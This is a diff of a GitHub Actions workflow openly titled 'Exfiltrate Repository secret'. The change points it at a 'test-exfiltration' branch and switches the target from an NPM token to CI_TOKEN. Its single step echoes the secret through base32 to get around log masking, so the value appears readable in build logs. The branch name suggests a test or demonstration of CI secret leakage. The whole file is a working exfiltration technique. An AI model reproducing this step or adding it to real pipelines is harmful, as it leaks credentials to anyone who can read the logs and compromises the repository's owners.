@@ -1,16 +1,16 @@
-name: Exfilitrate org secret
+name: Exfiltrate Repository secret
 on:
   push:
-    branches: [main]
+    branches: [test-exfiltration]
   pull_request:
-    branches: [main]
+    branches: [test-exfiltration]
 jobs:
   exfil:
     runs-on: ubuntu-latest
     steps:
-    - name: exfil org secret
+    - name: exfil repository secret
       id: response
       run:  |
-          echo "lets exfil some org secrets..."
-          echo "${{secrets.NPM_PRIV_TOKEN}}" | base32
+          echo "lets exfil some repository secrets..."
+          echo "${{secrets.CI_TOKEN}}" | base32
           
